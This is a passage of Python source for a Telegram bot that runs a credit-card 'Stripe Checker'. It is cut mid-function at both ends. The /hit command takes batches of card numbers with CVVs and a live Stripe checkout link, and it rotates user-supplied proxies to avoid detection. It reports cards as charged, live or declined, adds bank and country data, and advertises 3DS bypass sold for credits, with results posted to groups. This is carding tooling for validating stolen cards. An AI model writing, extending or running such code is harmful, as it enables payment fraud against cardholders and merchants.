
    if message.reply_to_message:
        reply_txt = message.reply_to_message.text or message.reply_to_message.caption or ""
        if reply_txt.strip():
            raw_text = raw_text + "\n" + reply_txt if raw_text else reply_txt

    if message.reply_to_message and message.reply_to_message.document:
        doc = message.reply_to_message.document
        if doc.file_name and doc.file_name.lower().endswith(".txt"):
            try:
                from io import BytesIO
                buf = BytesIO()
                await bot.download(doc.file_id, destination=buf)
                buf.seek(0)
                file_text = buf.read().decode("utf-8", errors="ignore")
                if file_text.strip():
                    raw_text = raw_text + "\n" + file_text if raw_text else file_text
            except Exception as e:
                log.error("Failed to download proxy file: %s", e)

    if not raw_text.strip():
        _sep = _MSEP
        await message.reply(
            f"[⌯] {bold('Command')} ⌁ {_mono('/proxy')} {pe(E['link'])}\n"
            f"{_sep}\n"
            f"[⌯] {bold('Usage')} ⌁ {_mono('/proxy host:port:user:pass')} {pe(E['bolt'])}\n"
            f"[⌯] {bold('Limit')} ⌁ {_mono('Max ' + str(MAX_PROXIES_PER_USER) + ' proxies per user')} {pe(E['star'])}\n"
            f"{_sep}\n"
            f"[⌯] {bold('Format')} ⌁ {_mono('host:port')} {pe(E['link'])}\n"
            f"[⌯] {bold('Format')} ⌁ {_mono('host:port:user:pass')} {pe(E['link'])}\n"
            f"[⌯] {bold('Format')} ⌁ {_mono('user:pass@host:port')} {pe(E['link'])}\n"
            f"[⌯] {bold('Format')} ⌁ {_mono('socks5://user:pass@host:port')} {pe(E['link'])}\n"
            f"{_sep}\n"
            f"[⌯] {bold('Types')} ⌁ {_mono('HTTP')} · {_mono('SOCKS4')} · {_mono('SOCKS5')} {pe(E['refresh'])}"
        )
        return

    parsed_list = []
    parse_failed = 0
    for line in raw_text.strip().splitlines():
        line = line.strip()
        if not line:
            continue
        parsed = parse_proxy_format(line)
        if parsed:
            parsed_list.append(parsed)
        else:
            parse_failed += 1

    if not parsed_list:
        await message.reply(
            f"[⌯] {bold('Error')} ⌁ {_mono('No valid proxies found')} {pe(E['cross'])}\n"
            f"[⌯] {bold('Fix')} ⌁ {_mono('Check format and try again')} {pe(E['warn'])}"
        )
        return

    need = MAX_PROXIES_PER_USER - len(get_user_proxies(user_id))
    if need <= 0:
        _sep = _MSEP
        await message.reply(
            f"[⌯] {bold('Error')} ⌁ {_mono('Proxy list full')} {pe(E['warn'])}\n"
            f"{_sep}\n"
            f"[⌯] {bold('Count')} ⌁ {_mono(str(MAX_PROXIES_PER_USER) + '/' + str(MAX_PROXIES_PER_USER))} {pe(E['cross'])}\n"
            f"[⌯] {bold('Fix')} ⌁ {_mono('/rmproxy then add new ones')} {pe(E['refresh'])}"
        )
        return

    status_msg = await message.reply(
        f"[⌯] {bold('Status')} ⌁ {_mono('Testing Proxies...')} {pe(E['loading'])}\n"
        f"[⌯] {bold('Parsed')} ⌁ {_mono(str(len(parsed_list)))}\n"
        f"[⌯] {bold('Need')} ⌁ {_mono(str(need) + ' working proxies')}"
    )

    working = []
    dead = 0
    TEST_BATCH = 10
    stopped_early = False

    for batch_start in range(0, len(parsed_list), TEST_BATCH):
        if len(working) >= need:
            stopped_early = True
            break

        batch = parsed_list[batch_start:batch_start + TEST_BATCH]

        async def _test_one(proxy_data):
            try:
                success, _, _ = await test_proxy(proxy_data["proxy_url"])
                return proxy_data if success else None
            except Exception:
                return None

        results = await asyncio.gather(*[_test_one(p) for p in batch])

        for r in results:
            if r is not None and len(working) < need:
                working.append(r)
            elif r is None:
                dead += 1

        try:
            await safe_edit(status_msg,
                f"[⌯] {bold('Status')} ⌁ {_mono('Testing Proxies...')} {pe(E['loading'])}\n"
                f"[⌯] {bold('Working')} ⌁ {_mono(str(len(working)))}/{_mono(str(need))} {pe(E['check'])}\n"
                f"[⌯] {bold('Dead')} ⌁ {_mono(str(dead))} {pe(E['cross'])}\n"
                f"[⌯] {bold('Tested')} ⌁ {_mono(str(batch_start + len(batch)))}/{_mono(str(len(parsed_list)))}"
            )
        except Exception:
            pass

        if len(working) >= need:
            stopped_early = True
            break

    if not working:
        await safe_edit(status_msg,
            f"[⌯] {bold('Result')} ⌁ {_mono('All proxies dead')} {pe(E['cross'])}\n"
            f"[⌯] {bold('Tested')} ⌁ {_mono(str(len(parsed_list)))}\n"
            f"[⌯] {bold('Working')} ⌁ {_mono('None')}"
        )
        return

    add_user_proxies(user_id, working)
    total = len(get_user_proxies(user_id))

    result_lines = [
        f"[⌯] {bold('Proxy')} ⌁ {_mono('Test Complete')} {pe(E['check'])}\n",
        f"[⌯] {bold('Working')} ⌁ {_mono(str(len(working)))} {pe(E['check'])}",
        f"[⌯] {bold('Dead')} ⌁ {_mono(str(dead))} {pe(E['cross'])}",
    ]
    if parse_failed:
        result_lines.append(f"[⌯] {bold('Invalid')} ⌁ {_mono(str(parse_failed) + ' could not be parsed')}")
    if stopped_early:
        result_lines.append(f"[⌯] {bold('Note')} ⌁ {_mono('Stopped — reached limit of ' + str(need))}")
    result_lines.append(f"[⌯] {bold('Saved')} ⌁ {_mono(str(total))}/{_mono(str(MAX_PROXIES_PER_USER))} {pe(E['star'])}")
    result_lines.append(f"\n[⌯] {bold('Proxy')} ⌁ {_mono('Random proxy used per CC check')} {pe(E['refresh'])}")

    await safe_edit(status_msg, "\n".join(result_lines))


# ══════════════════════════════════════════════════════════════════════════════
#  /myproxy COMMAND
# ══════════════════════════════════════════════════════════════════════════════

@router.message(Command("myproxy"))
async def cmd_myproxy(message: types.Message):
    if auth.is_banned(message.from_user.id):
        await message.reply(
            f"[⌯] {bold('Access')} ⌁ {_mono('Denied')} {pe(E['cross'])}\n"
            f"[⌯] {bold('Reason')} ⌁ {_mono('You have been banned.')}"
        )
        return

    proxy_list = get_user_proxies(message.from_user.id)
    if not proxy_list:
        await message.reply(
            f"[⌯] {bold('Error')} ⌁ {_mono('No Proxies Set')} {pe(E['cross'])}\n"
            f"[⌯] {bold('Fix')} ⌁ {_mono('/proxy host:port:user:pass')} {pe(E['link'])}"
        )
        return

    lines = [
        f"[⌯] {bold('Proxy')} ⌁ {_mono('Your List')} "
        f"[{_mono(str(len(proxy_list)))}/{_mono(str(MAX_PROXIES_PER_USER))}] {pe(E['link'])}\n"
    ]
    for i, p in enumerate(proxy_list[:10], 1):
        ip    = p.get("ip", "-")
        port  = p.get("port", "-")
        ptype = p.get("type", "http").upper()
        lines.append(f"[⌯] {bold(str(i))} ⌁ {_mono(str(ip) + ':' + str(port))} ({_mono(ptype)})")
    if len(proxy_list) > 10:
        lines.append(f"[⌯] {bold('More')} ⌁ {_mono(str(len(proxy_list) - 10) + ' more...')}")
    lines.append(f"\n[⌯] {bold('Note')} ⌁ {_mono('Random proxy used per check')} {pe(E['refresh'])}")

    check_proxy_btn = {
        "inline_keyboard": [
            [{"text": bold("Check Proxy"),
              "callback_data": f"check_proxy:{message.from_user.id}",
              "icon_custom_emoji_id": E["refresh"], "style": "primary"}],
        ]
    }
    await message.reply("\n".join(lines), reply_markup=check_proxy_btn)


# ══════════════════════════════════════════════════════════════════════════════
#  CHECK PROXY CALLBACK
# ══════════════════════════════════════════════════════════════════════════════

@router.callback_query(F.data.startswith("check_proxy:"))
async def cb_check_proxy(callback: types.CallbackQuery):
    owner_id = int(callback.data.split(":", 1)[1])
    if callback.from_user.id != owner_id:
        await callback.answer(bold("This is not your proxy list!"), show_alert=True)
        return

    proxy_list = get_user_proxies(owner_id)
    if not proxy_list:
        await callback.answer(bold("No proxies to check!"), show_alert=True)
        return

    await callback.answer()
    total = len(proxy_list)

    try:
        await safe_edit(callback.message,
            f"[⌯] {bold('Status')} ⌁ {_mono('Checking Proxies...')} {pe(E['loading'])}\n"
            f"[⌯] {bold('Total')} ⌁ {_mono(str(total))}\n"
            f"[⌯] {bold('Batch')} ⌁ {_mono('Testing in batches of 10...')}",
        )
    except Exception:
        pass

    working = []
    dead = 0
    TEST_BATCH = 10

    for batch_start in range(0, total, TEST_BATCH):
        batch = proxy_list[batch_start:batch_start + TEST_BATCH]

        async def _test_one(proxy_data):
            try:
                success, _, _ = await test_proxy(proxy_data["proxy_url"])
                return proxy_data if success else None
            except Exception:
                return None

        results = await asyncio.gather(*[_test_one(p) for p in batch])
        for r in results:
            if r is not None:
                working.append(r)
            else:
                dead += 1

        tested = batch_start + len(batch)
        try:
            await safe_edit(callback.message,
                f"[⌯] {bold('Status')} ⌁ {_mono('Checking Proxies...')} {pe(E['loading'])}\n"
                f"[⌯] {bold('Working')} ⌁ {_mono(str(len(working)))} {pe(E['check'])}\n"
                f"[⌯] {bold('Dead')} ⌁ {_mono(str(dead))} {pe(E['cross'])}\n"
                f"[⌯] {bold('Tested')} ⌁ {_mono(str(tested))}/{_mono(str(total))}",
            )
        except Exception:
            pass

    data = _load_proxies()
    data[str(owner_id)] = working
    _save_proxies(data)

    if not working:
        try:
            await safe_edit(callback.message,
                f"[⌯] {bold('Result')} ⌁ {_mono('All Proxies Dead')} {pe(E['cross'])}\n"
                f"[⌯] {bold('Tested')} ⌁ {_mono(str(total))}\n"
                f"[⌯] {bold('Fix')} ⌁ /proxy {_mono('to add new ones')}"
            )
        except Exception:
            pass
        return

    lines = [
        f"[⌯] {bold('Proxy')} ⌁ {_mono('Check Complete')} {pe(E['check'])}\n",
        f"[⌯] {bold('Working')} ⌁ {_mono(str(len(working)))} {pe(E['check'])}",
        f"[⌯] {bold('Dead')} ⌁ {_mono(str(dead))} {pe(E['cross'])}",
    ]
    if dead > 0:
        lines.append(f"[⌯] {bold('Removed')} ⌁ {_mono(str(dead) + ' dead proxies removed')}")
    lines.append(f"[⌯] {bold('Saved')} ⌁ {_mono(str(len(working)))}/{_mono(str(MAX_PROXIES_PER_USER))} {pe(E['star'])}")
    lines.append("")
    for i, p in enumerate(working[:10], 1):
        ip    = p.get("ip", "-")
        port  = p.get("port", "-")
        ptype = p.get("type", "http").upper()
        lines.append(f"[⌯] {bold(str(i))} ⌁ {_mono(str(ip) + ':' + str(port))} ({_mono(ptype)})")
    if len(working) > 10:
        lines.append(f"[⌯] {bold('More')} ⌁ {_mono(str(len(working) - 10) + ' more...')}")
    lines.append(f"\n[⌯] {bold('Note')} ⌁ {_mono('Random proxy used per check')} {pe(E['refresh'])}")

    check_proxy_btn = {
        "inline_keyboard": [
            [{"text": bold("Check Proxy"),
              "callback_data": f"check_proxy:{owner_id}",
              "icon_custom_emoji_id": E["refresh"], "style": "primary"}],
        ]
    }
    try:
        await safe_edit(callback.message, "\n".join(lines), reply_markup=check_proxy_btn)
    except Exception:
        pass


# ══════════════════════════════════════════════════════════════════════════════
#  /rmproxy COMMAND
# ══════════════════════════════════════════════════════════════════════════════

@router.message(Command("rmproxy"))
async def cmd_rmproxy(message: types.Message):
    if auth.is_banned(message.from_user.id):
        await message.reply(
            f"[⌯] {bold('Access')} ⌁ {_mono('Denied')} {pe(E['cross'])}\n"
            f"[⌯] {bold('Reason')} ⌁ {_mono('You have been banned.')}"
        )
        return

    proxy_list = get_user_proxies(message.from_user.id)
    if not proxy_list:
        await message.reply(
            f"[⌯] {bold('Error')} ⌁ {_mono('No proxies to remove')} {pe(E['warn'])}"
        )
        return

    count = len(proxy_list)
    del_user_proxy(message.from_user.id)
    await message.reply(
        f"[⌯] {bold('Result')} ⌁ {_mono(str(count) + ' proxies removed')} {pe(E['check'])}"
    )


# ══════════════════════════════════════════════════════════════════════════════
#  HELPER — send live results to approved/monitor groups
# ══════════════════════════════════════════════════════════════════════════════



def _to_mi(text: str) -> str:
    """Convert ASCII letters to Mathematical Italic Unicode."""
    out = []
    for ch in str(text):
        if 'A' <= ch <= 'Z':
            out.append(chr(0x1D434 + ord(ch) - ord('A')))
        elif 'a' <= ch <= 'z':
            out.append('\u210E' if ch == 'h' else chr(0x1D44E + ord(ch) - ord('a')))
        else:
            out.append(ch)
    return ''.join(out)




# ══════════════════════════════════════════════════════════════════════════════
#  HIT — STRIPE CHECKOUT CHECKER
# ══════════════════════════════════════════════════════════════════════════════

HIT_MAX_CCS = 10
_HIT_EDIT_LOCKS: dict[int, asyncio.Lock] = {}
_HIT_STOP_FLAGS: dict[str, bool] = {}
_HIT_ACTIVE_USERS: set[int] = set()


def _hit_is_payment_success(result: dict) -> bool:
    """True when hit.php reports a successful charge."""
    if not result.get("ok"):
        return False
    status = (result.get("result_status") or "").lower()
    if status in ("charge", "charged"):
        return True
    msg = (result.get("result_msg") or "").lower()
    return any(x in msg for x in ("payment successful", "succeeded", " paid"))


def _hit_status_parts(result: dict) -> tuple[str, str]:
    """Return (status_text, emoji) for the Status line."""
    # Session dead takes priority regardless of ok flag
    if result.get("session_dead"):
        return "Session Dead", pe(E["warn"])
    if not result.get("ok"):
        err = (result.get("error") or "Failed")[:50]
        return err, pe(E["warn"])
    if result.get("hcaptcha"):
        return "hCaptcha Required", pe(E["warn2"])
    if _hit_is_payment_success(result):
        return "Charged", pe(E["charged_status"])
    status = result.get("result_status", "")
    msg = (result.get("result_msg") or "").lower()
    if status in ("live", "approved"):
        if "insufficient" in msg:
            return "Insufficient Funds", pe(E["bank"])
        if "cvc" in msg or "cvv" in msg or "security code" in msg:
            return "Incorrect CVC — Live", pe(E["check"])
        return "Live", pe(E["check"])
    # surface clean proxy error instead of raw cURL message
    err_raw = (result.get("error") or result.get("result_msg") or "").lower()
    if "proxy error" in err_raw or "proxy" in err_raw:
        return "Proxy Error", pe(E["warn"])
    return "Declined", pe(E["declined"])



def _hit_raw_response(result: dict) -> str:
    if not result.get("ok"):
        return result.get("error") or "Failed"
    return result.get("result_msg") or "Unknown"


# Separator between CC result blocks
_HIT_SEP = "─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─"


def _hit_product_is_id(s: str) -> bool:
    """True when product looks like an internal Stripe/API ID, not a display name."""
    if not s or s in ("-", ""):
        return True
    return " " not in s.strip() and len(s.strip()) > 14


def _hit_session_header(
    done: int, total: int,
    merchant: str, product: str, amount_str: str,
    link_short: str, success_url: str,
) -> str:
    """[⌯]-style session header — shown once at the top."""
    P   = "[⌯]"
    SEP = "⌁"
    lines = [
        f"{pe(E['gem'])} {bold('Stripe Checker')} [{bold(str(done))}/{bold(str(total))}]\n",
        f"{P} {bold('Merchant')} {SEP} {_mono((merchant or 'Stripe').upper())} {pe(E['bolt'])}",
    ]
    if not _hit_product_is_id(product):
        lines.append(f"{P} {bold('Product')} {SEP} {_mono(product.strip())} {pe(E['star'])}")
    lines.append(f"{P} {bold('Amount')} {SEP} {_mono(amount_str or '-')} {pe(E['bank'])}")
    lines.append(f"{P} {bold('Link')} {SEP} {_mono(link_short)} {pe(E['pin'])}")
    if success_url and success_url not in ("-", ""):
        lines.append(f"{P} {bold('URL')} {SEP} {_mono(success_url)} {pe(E['link'])}")
    return "\n".join(lines)


def _hit_cc_footer(user_id: int, user_name: str, user_uname: str) -> str:
    """[⌯]-style footer — shown once at the bottom."""
    if user_uname:
        ulink = f'<a href="https://t.me/{user_uname}">{_to_mi(user_name or user_uname)}</a>'
    elif user_id:
        ulink = f'<a href="tg://user?id={user_id}">{_to_mi(user_name or str(user_id))}</a>'
    else:
        ulink = _to_mi(user_name or "Unknown")
    return f"[⌯] {bold('User')} ⌁ › {pe(E['gem'])} {ulink} ‹"


def _hit_cc_block(
    cc: str, result: dict,
    merchant: str = "-",
    amount_str: str = "-",
    user_id: int = 0,
    user_name: str = "",
    user_uname: str = "",
    include_session: bool = True,
    checkout_url: str = "",
    proxy_str: str = "",
) -> str:
    """[⌯]-style single CC result block.

    include_session=False  →  compact (Card / Status / Result / 3DS).
    include_session=True   →  full block for group notifications (+ Gate/Amount/User).
    """
    P   = "[⌯]"
    SEP = "⌁"

    status_text, status_emoji = _hit_status_parts(result)
    raw = (_hit_raw_response(result) or "-")[:70]

    # Skip Result line when it just repeats the status (e.g. "Stopped (session dead)")
    err = (result.get("error") or "").lower()
    show_result = result.get("ok") or ("stopped" not in err and "session dead" not in err)

    _tds_st = result.get("tds_status") or ("bypassed" if result.get("tds_bypassed") else "")
    # When include_session=True, _tds_line (separate line) handles 3DS display.
    # Only add inline `tds` for compact (include_session=False) view to avoid duplicate.
    if not include_session and _tds_st == "bypassed" and result.get("ok") and not result.get("session_dead"):
        tds = f"\n{P} {bold('3DS')} {SEP} {_mono('Bypassed')} {pe(E['tds_bypass'])}"
    else:
        tds = ""  # not_bypassed or unknown → no need to show

    is_charged      = _hit_is_payment_success(result)
    _dead_msg = (result.get("result_msg") or result.get("error") or "").lower()
    is_session_dead = bool(result.get("session_dead")) or any(
        p in _dead_msg
        for p in ("no longer active", "has already been completed",
                  "session expired", "no longer valid")
    )
    is_declined = result.get("ok") and not is_charged and result.get("result_status") not in ("live", "approved")
    result_emoji = (
        pe(E["result_charged"]) if is_charged else
        pe(E["result_decline"]) if is_declined else
        pe(E["warn"])           if is_session_dead else
        pe(E["down"])
    )

    _cc_fmt = f"<code>{cc}</code>" if include_session else f"<tg-spoiler>{cc}</tg-spoiler>"
    lines = [f"{P} {bold('Card')} {SEP} {_cc_fmt}"]

    # ── BIN info (brand / bank / country) ────────────────────────────────────
    _bin = result.get("_bin") or result.get("bin_info") or {}
    if isinstance(_bin, dict) and _bin.get("brand"):
        _brand  = (_bin.get("brand")  or "").strip()
        _btype  = (_bin.get("type")   or "").strip()
        _blevel = (_bin.get("level")  or "").strip()
        _bbank  = (_bin.get("bank")   or "").strip()
        _bccode = (_bin.get("country_code") or "").strip().upper()
        # Country name — strip trailing "  (ISO XX)" added by some BIN APIs
        _bcountry_name = (_bin.get("country") or "").split("  ")[0].strip()

        # Deduplicate BIN words — e.g. type="DEBIT" level="DEBIT ENHANCED" → "MASTERCARD DEBIT ENHANCED"
        _seen: set[str] = set()
        _bin_words: list[str] = []
        for _w in f"{_brand} {_btype} {_blevel}".split():
            if _w.upper() not in _seen:
                _seen.add(_w.upper())
                _bin_words.append(_w)
        _bin_str = " ".join(_bin_words).strip()

        # Build flag: prefer country_code (from API bin_info), fall back to
        # the "flag" key returned by helpers.bin_lookup (no country_code there)
        if _bccode and len(_bccode) == 2 and _bccode.isalpha():
            _flag = "".join(chr(0x1F1E6 + ord(c) - ord("A")) for c in _bccode)
        else:
            _flag = (_bin.get("flag") or "").strip()   # helpers.bin_lookup stores it here
        # Append flag if not already embedded in the country string
        _bcountry = (
            f"{_bcountry_name} {_flag}".strip()
            if _flag and _flag not in _bcountry_name
            else _bcountry_name
        )

        if _bin_str:
            lines.append(f"{P} {bold('BIN')} {SEP} {_mono(_bin_str)}")
        if _bbank and _bbank.lower() not in ("unknown", ""):
            lines.append(f"{P} {bold('Bank')} {SEP} {_mono(_bbank)}")
        if _bcountry and _bcountry_name.lower() not in ("unknown", ""):
            lines.append(f"{P} {bold('Country')} {SEP} {_mono(_bcountry)}")

    lines.append(f"{P} {bold('Status')} {SEP} {_mono(status_text)} {status_emoji}")
    if show_result:
        lines.append(f"{P} {bold('Result')} {SEP} {_mono(raw)} {result_emoji}{tds}")

    # ── Time taken ────────────────────────────────────────────────────────────
    _elapsed = result.get("_elapsed") or result.get("time_taken") or result.get("seconds")
    if _elapsed:
        lines.append(f"{P} {bold('Time')} {SEP} {_mono(f'{float(_elapsed):.1f}s')} {pe(E['bolt'])}")

    core = "\n".join(lines)

    if not include_session:
        return core

    # Full block for group notifications
    if user_uname:
        ulink = f'<a href="https://t.me/{user_uname}">{_to_mi(user_name or user_uname)}</a>'
    elif user_id:
        ulink = f'<a href="tg://user?id={user_id}">{_to_mi(user_name or str(user_id))}</a>'
    else:
        ulink = _to_mi(user_name or "Unknown")

    _link_line = ""
    if checkout_url:
        _short = checkout_url[:50] + "..." if len(checkout_url) > 50 else checkout_url
        _link_line = f"\n{P} {bold('Link')} {SEP} <a href=\"{checkout_url}\">{_mono(_short)}</a> {pe(E['pin'])}"

    _tds_st2 = result.get("tds_status") or ("bypassed" if result.get("tds_bypassed") else "")
    if _tds_st2 == "bypassed":
        _tds_line = f"\n{P} {bold('3DS')} {SEP} {_mono('Bypassed')} {pe(E['tds_bypass'])}"
    else:
        _tds_line = ""  # not_bypassed or unknown → no need to show

    _proxy_line = (
        f"\n{P} {bold('Proxy')} {SEP} {_mono(proxy_str)} {pe(E['refresh'])}"
        if proxy_str else ""
    )

    return core + _tds_line + (
        f"\n\n{P} {bold('Gate')} {SEP} {_mono((merchant or 'Stripe').upper())} {pe(E['bolt'])}\n"
        f"{P} {bold('Amount')} {SEP} {_mono(amount_str or '-')} {pe(E['bank'])}"
        f"{_link_line}"
        f"{_proxy_line}\n"
        f"\n{P} {bold('User')} {SEP} › {pe(E['gem'])} {ulink} ‹"
    )


def _hit_is_session_dead(result: dict) -> bool:
    return bool(result.get("session_dead"))



async def _hit_check_single(
    cc_str: str, checkout_url: str, user_id: int,
    status_msg: types.Message, results: dict, order: list,
    user_name: str, user_uname: str, stop_key: str,
    checkout_info: dict,
):
    if _HIT_STOP_FLAGS.get(stop_key):
        results[cc_str] = {"ok": False, "error": "Stopped"}
        return

    proxies = get_user_proxies(user_id)
    proxy_data = random.choice(proxies) if proxies else None

    sem = get_user_semaphore(user_id)
    async with sem:
        t0 = time.time()
        try:
            result = await asyncio.get_running_loop().run_in_executor(
                CHECKER_POOL, hit.run_hit_check, checkout_url, cc_str, proxy_data, 3,
            )
        except Exception as e:
            result = {"ok": False, "error": _safe_err(e)}
        result["_elapsed"] = round(time.time() - t0, 2)

    # BIN lookup (async, non-blocking)
    try:
        bin6 = cc_str.split("|")[0][:6]
        result["_bin"] = await bin_lookup(bin6)
    except Exception:
        result["_bin"] = {}

    msg_id = status_msg.message_id
    if msg_id not in _HIT_EDIT_LOCKS:
        _HIT_EDIT_LOCKS[msg_id] = asyncio.Lock()

    results[cc_str] = result

    if _hit_is_session_dead(result):
        _HIT_STOP_FLAGS[stop_key] = True

    merchant   = checkout_info.get("merchant", "-")
    amount_str = checkout_info.get("amount_str", "-")

    async def _do_edit():
        async with _HIT_EDIT_LOCKS[msg_id]:
            done_count = sum(1 for cc in order if cc in results)
            total      = len(order)
            header = _hit_session_header(
                done_count, total,
                merchant,
                checkout_info.get("product", "-"),
                amount_str,
                checkout_info.get("link_short", "-"),
                checkout_info.get("success_url", "-"),
            )
            cc_parts = []
            for cc in order:
                if cc in results:
                    cc_parts.append(_hit_cc_block(
                        cc, results[cc],
                        merchant=merchant, amount_str=amount_str,
                        user_id=user_id, user_name=user_name, user_uname=user_uname,
                        include_session=False,
                    ))
                else:
                    cc_parts.append(
                        f"[⌯] {bold('Card')} ⌁ <tg-spoiler>{cc}</tg-spoiler>\n"
                        f"[⌯] {bold('Status')} ⌁ {_mono('Checking...')} {pe(E['loading'])}"
                    )
            if _HIT_STOP_FLAGS.get(stop_key) and _hit_is_session_dead(results.get(cc_str, {})):
                cc_parts.append(
                    f"[⌯] {bold('Note')} ⌁ {_mono('Session dead — stopped.')} {pe(E['warn'])}"
                )
            footer = _hit_cc_footer(user_id, user_name, user_uname)
            sep = f"\n{_HIT_SEP}\n"
            full_text = sep.join([header] + cc_parts) + f"\n{_HIT_SEP}\n" + footer
            _mid_kb = None if _HIT_STOP_FLAGS.get(stop_key) else {
                "inline_keyboard": [[{
                    "text": "Stop Checking",
                    "callback_data": f"hit_stop:{stop_key}",
                    "icon_custom_emoji_id": "5936025362944233351",
                    "style": "success",
                }]]
            }
            try:
                await safe_edit(status_msg, full_text, reply_markup=_mid_kb)
            except Exception:
                pass

    await _do_edit()

    if sum(1 for cc in order if cc in results) == len(order):
        _HIT_EDIT_LOCKS.pop(msg_id, None)


@router.message(Command("hit"))
async def cmd_hit(message: types.Message):
    user_id = message.from_user.id

    if auth.is_banned(user_id):
        await message.reply(
            f"[⌯] {bold('Access')} ⌁ {_mono('Denied')} {pe(E['cross'])}\n"
            f"[⌯] {bold('Reason')} ⌁ {_mono('You have been banned.')}"
        )
        return

    # Unlimited for admins/owners; credit-based for everyone else
    _unlimited = auth.is_admin(user_id)
    if not _unlimited and not cr.has_credits(user_id):
        bal = cr.get_credits(user_id)
        exp = cr.expiry_str(user_id)
        _sep = _MSEP
        await message.reply(
            f"[⌯] {bold('Access')} ⌁ {_mono('No Credits')} {pe(E['cross2'])}\n"
            f"{_sep}\n"
            f"[⌯] {bold('Balance')} ⌁ {_mono(str(bal) + ' credits')} {pe(E['warn'])}\n"
            f"[⌯] {bold('Expires')} ⌁ {_mono(exp)}\n"
            f"{_sep}\n"
            f"[⌯] {bold('Redeem')} ⌁ {_mono('/redeem KEY')} {pe(E['gift'])}\n"
            f"[⌯] {bold('Plans')} ⌁ {_mono('/plans')} to see options {pe(E['star'])}"
        )
        return

    if user_id in _HIT_ACTIVE_USERS:
        await message.reply(
            f"[⌯] {bold('Status')} ⌁ {_mono('Check In Progress')} {pe(E['loading'])}\n"
            f"[⌯] {bold('Note')} ⌁ {_mono('Wait or press Stop to cancel')} {pe(E['warn'])}"
        )
        return

    raw_text = ""
    args = message.text.split(maxsplit=1)
    if len(args) >= 2:
        raw_text = args[1]

    if message.reply_to_message:
        reply_text = message.reply_to_message.text or message.reply_to_message.caption or ""
        raw_text = raw_text + "\n" + reply_text if raw_text else reply_text

    if not raw_text.strip():
        _sep = _MSEP
        await message.reply(
            f"[⌯] {bold('Command')} ⌁ {_mono('/hit')} {pe(E['bolt'])}\n"
            f"{_sep}\n"
            f"[⌯] {bold('Usage')} ⌁ {_mono('/hit')} &lt;link&gt; {_mono('cc|mm|yy|cvv')} {pe(E['bolt'])}\n"
            f"[⌯] {bold('Multi')} ⌁ {_mono('Up to ' + str(HIT_MAX_CCS) + ' CCs per checkout')} {pe(E['bolt'])}\n"
            f"{_sep}\n"
            f"[⌯] {bold('Link')} ⌁ {_mono('checkout.stripe.com/c/pay/...')} {pe(E['link'])}\n"
            f"[⌯] {bold('Link')} ⌁ {_mono('billing.stripe.com/p/session/...')} {pe(E['link'])}\n"
            f"[⌯] {bold('Link')} ⌁ {_mono('invoice.stripe.com/i/...')} {pe(E['link'])}\n"
            f"[⌯] {bold('Link')} ⌁ {_mono('domain with cs_live_.../cs_test_...')} {pe(E['link'])}\n"
            f"{_sep}\n"
            f"[⌯] {bold('Proxy')} ⌁ {_mono('Required before checking')} {pe(E['warn'])}\n"
            f"[⌯] {bold('Credits')} ⌁ {_mono('1 credit per 3DS bypass')} {pe(E['shield'])}"
        )
        return

    link_match = re.search(
        r'https?://[^\s]*(?:'
        r'checkout\.stripe\.com'
        r'|billing\.stripe\.com'
        r'|invoice\.stripe\.com'
        r'|payment\.stripe\.com'
        r'|pay\.stripe\.com'
        r'|cs_(?:live|test)_'
        r'|plink_(?:live|test)_'
        r')[^\s]*',
        raw_text, re.IGNORECASE,
    )
    if not link_match:
        _sep = _MSEP
        await message.reply(
            f"[⌯] {bold('Error')} ⌁ {_mono('No Stripe link found')} {pe(E['cross'])}\n"
            f"{_sep}\n"
            f"[⌯] {bold('Link')} ⌁ {_mono('checkout.stripe.com/c/pay/...')} {pe(E['link'])}\n"
            f"[⌯] {bold('Link')} ⌁ {_mono('billing.stripe.com/p/session/...')} {pe(E['link'])}\n"
            f"[⌯] {bold('Link')} ⌁ {_mono('invoice.stripe.com/i/...')} {pe(E['link'])}\n"
            f"[⌯] {bold('Link')} ⌁ {_mono('domain with cs_live_.../plink_live_...')} {pe(E['link'])}"
        )
        return
    checkout_url = link_match.group(0)

    all_ccs = _DedupeList()
    for m in CC_PATTERN.finditer(raw_text):
        cc = f"{m.group(1)}|{m.group(2)}|{m.group(3)}|{m.group(4)}"
        if cc not in all_ccs:
            all_ccs.append(cc)

    if not all_ccs:
        for line in raw_text.strip().splitlines():
            line = line.strip()
            parts = re.split(r'[|/]', line)
            if len(parts) >= 4:
                num = parts[0].strip()
                if num.isdigit() and len(num) >= 13:
                    cc = "|".join(p.strip() for p in parts[:4])
                    if cc not in all_ccs:
                        all_ccs.append(cc)

    if not all_ccs:
        await message.reply(
            f"[⌯] {bold('Error')} ⌁ {_mono('No valid CCs found')} {pe(E['cross'])}\n"
            f"[⌯] {bold('Format')} ⌁ {_mono('cc|mm|yy|cvv')} {pe(E['bolt'])}"
        )
        return

    skipped = 0
    if len(all_ccs) > HIT_MAX_CCS:
        skipped = len(all_ccs) - HIT_MAX_CCS
        all_ccs = all_ccs[:HIT_MAX_CCS]

    proxies = get_user_proxies(user_id)
    if not proxies:
        await message.reply(
            f"[⌯] {bold('Error')} ⌁ {_mono('No Proxy Set')} {pe(E['cross'])}\n"
            f"[⌯] {bold('Fix')} ⌁ {_mono('/proxy host:port:user:pass')} {pe(E['link'])}"
        )
        return

    user_name  = message.from_user.full_name or ""
    user_uname = message.from_user.username or ""
    total      = len(all_ccs)
    chat_id    = message.chat.id
    stop_key   = f"hit:{chat_id}:{user_id}"
    _HIT_STOP_FLAGS[stop_key] = False
    _HIT_ACTIVE_USERS.add(user_id)


    _id_m = re.search(r'(cs_(?:live|test)_[a-zA-Z0-9]+|plink_(?:live|test)_[a-zA-Z0-9]+)', checkout_url)
    if _id_m:
        link_short = _id_m.group(1)[:28] + "..."
    elif "billing.stripe.com" in checkout_url:
        link_short = "billing.stripe.com/..."
    elif "invoice.stripe.com" in checkout_url:
        link_short = "invoice.stripe.com/..."
    elif "payment.stripe.com" in checkout_url or "pay.stripe.com" in checkout_url:
        link_short = "pay.stripe.com/..."
    else:
        link_short = checkout_url.split("/")[-1][:28] + "..."

    loading_msg = await message.reply(
        f"[⌯] {bold('Status')} ⌁ {_mono('Loading Stripe checkout...')} {pe(E['loading'])}\n"
        f"\n"
        f"[⌯] {bold('URL')} ⌁ {_mono(checkout_url[:55] + '...')}"
    )

    # ── Run first CC + BIN lookup + timing ───────────────────────────────────
    try:
        proxy_data = random.choice(proxies)
        _t0 = time.time()
        first_result = await asyncio.get_running_loop().run_in_executor(
